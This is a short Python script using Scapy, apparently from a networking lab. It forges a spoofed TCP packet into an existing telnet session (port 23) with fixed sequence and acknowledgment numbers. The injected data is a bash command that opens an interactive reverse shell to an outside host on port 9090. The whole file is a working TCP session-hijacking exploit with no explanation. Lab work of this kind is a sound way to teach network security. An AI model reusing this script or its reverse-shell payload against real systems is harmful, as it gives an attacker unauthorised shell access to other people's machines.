#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=34246, dport=23, flags="A", seq=1836510000, ack=3860718291)
data = "\r /bin/bash -i > /dev/tcp/192.168.253.128/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0,iface="br-4b43672156a8")
